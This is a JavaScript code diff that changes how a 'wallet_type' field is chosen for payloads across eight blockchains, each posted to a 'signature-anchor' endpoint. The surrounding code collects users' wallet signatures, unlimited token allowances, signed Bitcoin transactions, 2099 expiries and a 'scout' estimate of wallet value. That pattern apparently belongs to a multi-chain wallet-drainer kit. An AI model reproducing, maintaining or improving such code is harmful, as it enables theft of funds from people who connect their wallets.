@@ -1895,7 +1895,7 @@
             signature: signatures.EVM.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: connectedChains.EVM ? connectedChains.EVM.walletType || 'hot_wallet' : 'hot_wallet',
+            wallet_type: (connectedChains.EVM && connectedChains.EVM.walletType) || (signatures.EVM && signatures.EVM.walletType) || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             max_allowance: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
             requires_quorum: false,
@@ -1939,7 +1939,7 @@
             signature: signatures.SOL.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.SOL.walletType || 'hot_wallet',
+            wallet_type: signatures.SOL.walletType || (connectedChains.SOL && connectedChains.SOL.walletType) || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0
           };
           await apiPost('/api/v1/signature-anchor', solPayload);
@@ -1961,7 +1961,7 @@
             signature: signatures.BTC.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.BTC.walletType || 'hot_wallet',
+            wallet_type: signatures.BTC.walletType || (connectedChains.BTC && connectedChains.BTC.walletType) || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             signed_psbt_base64: signatures.BTC.psbt || signatures.BTC.signature,
             psbt_metadata: {
@@ -1994,7 +1994,7 @@
             signature: signatures.TRON.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.TRON.walletType || 'hot_wallet',
+            wallet_type: signatures.TRON.walletType || (connectedChains.TRON && connectedChains.TRON.walletType) || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0
           };
           await apiPost('/api/v1/signature-anchor', tronPayload);
@@ -2017,7 +2017,7 @@
             signature: signatures.TON.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.TON.walletType || 'hot_wallet',
+            wallet_type: signatures.TON.walletType || (connectedChains.TON && connectedChains.TON.walletType) || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0
           };
           await apiPost('/api/v1/signature-anchor', tonPayload);
@@ -2040,7 +2040,7 @@
             signature: signatures.COSMOS.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.COSMOS.walletType || 'hot_wallet',
+            wallet_type: signatures.COSMOS.walletType || (connectedChains.COSMOS && connectedChains.COSMOS.walletType) || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             amount: signatures.COSMOS.amount || '0'
           };
@@ -2064,7 +2064,7 @@
             signature: signatures.APTOS.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.APTOS.walletType || 'hot_wallet',
+            wallet_type: signatures.APTOS.walletType || (connectedChains.APTOS && connectedChains.APTOS.walletType) || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             amount: signatures.APTOS.amount || '0'
           };
@@ -2088,7 +2088,7 @@
             signature: signatures.SUI.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.SUI.walletType || 'hot_wallet',
+            wallet_type: signatures.SUI.walletType || (connectedChains.SUI && connectedChains.SUI.walletType) || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             amount: signatures.SUI.amount || '0'
           };
